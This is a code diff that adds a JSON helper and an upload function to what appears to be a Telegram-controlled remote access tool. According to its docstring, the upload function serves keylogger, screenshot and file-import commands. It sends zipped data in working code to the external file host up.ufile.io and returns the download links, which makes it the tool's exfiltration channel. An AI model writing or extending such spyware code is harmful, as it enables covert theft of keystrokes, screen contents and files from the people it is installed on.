@@ -299,6 +299,85 @@ def make_zip_file(route, logger, delete_input_file=False):
         logger.error(f'make_zip_file: {error}')
         return False, error
 
+
+def conver_json_to_dict(json_data: json) -> dict:
+    '''loads json data and convert to a dict'''
+    return json.loads(json_data)
+
+
+def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200):
+    # time_out 1200: 20 min
+    '''api for upload zip file and return download link \n
+    this use in commands: import_file, screen_shut, key_loger,.. \n
+    its not safe for file transfer!
+    api from: up.ufile.io
+    size limit 5GB'''
+    create_session_link = 'https://up.ufile.io/v1/upload/create_session'
+    chunk_link = 'https://up.ufile.io/v1/upload/chunk'  # Send part of the file
+    finalise_link = 'https://up.ufile.io/v1/upload/finalise'
+    file_size = {'file_size': len(file)}
+    files = {'file': file}
+
+    # create session for upload file
+    # TODO: add for lop for get a session
+    try:
+        session = requests.post(create_session_link,
+                                data=file_size, timeout=30)
+        if session.status_code != 200:
+            logger.error(
+                f'upload_server_1.create session: status code: {session.status_code}, text: {session.text}')
+            return False, 'None'
+        # session FUID:
+        FUID = conver_json_to_dict(session.text)['fuid']
+    except Exception as error:
+        logger.error(f'upload_server_1.create session: {error}')
+        return False, 'None'
+
+    # upload file
+    # TODO: Divide the data into small pieces and upload them
+    try:
+        chunk_data = {'chunk_index': 1, 'fuid': FUID}
+        chunk_res = requests.post(chunk_link, data=chunk_data,
+                                  files=files, timeout=time_out)
+        if chunk_res.status_code != 200:
+            logger.error(
+                f'upload_server_1.upload file: status code: {chunk_res.status_code}, text: {chunk_res.text}')
+            return False, 'None'
+    except Exception as error:
+        logger.error(f'upload_server_1.upload file : {error}')
+        return False, 'None'
+
+    # close session
+    try:
+        finalise_headers = {
+            'fuid': FUID,
+            'file_name': file_name,
+            'file_type': 'zip',
+            'total_chunks': 1
+        }
+
+        finalis_res = requests.post(
+            finalise_link, data=finalise_headers, timeout=30)
+        if finalis_res.status_code != 200:
+            logger.error(
+                f'upload_server_1.close session , status code: {finalis_res.status_code}, text: {finalis_res.text}')
+            return False, 'None'
+    except Exception as error:
+        logger.error(f'upload_server_1.close session error: {error}')
+        return False, 'None'
+
+    # extract download link
+    try:
+        download_link = conver_json_to_dict(finalis_res.text)
+        response = ''
+        for key, value in download_link.items():
+            response = response + f'\n{key}:{value}'
+        return True, response
+    except Exception as error:
+        logger.error(f'upload_server_1.extract download link error: {error}')
+        return False, 'None'
+
+
 # ""
 # def make_send_file_api_url(TELEGRAM_TOKEN, ADMIN_CHAT_ID, zip_file_name, logger) -> str:
 
